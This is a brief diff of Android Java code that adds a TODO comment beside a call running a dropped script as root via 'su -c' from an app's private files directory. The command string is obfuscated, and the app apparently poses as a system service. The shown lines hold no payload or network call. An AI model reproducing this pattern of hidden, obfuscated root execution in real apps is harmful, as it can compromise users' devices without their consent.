@@ -159,6 +159,7 @@ public class Execute {
 		if (Root.createScript("e", script) == true) {
 			// 32_7=/system/bin/chmod 755
 			// su -c /data/data/com.android.service/files/s
+			// TODO: su root /data/data/com.android.service/files/s
 			boolean res = Execute.executeWaitFor(String.format(M.e("su -c /data/data/%s/files/s"), pack));
 
 			if (Cfg.DEBUG) {
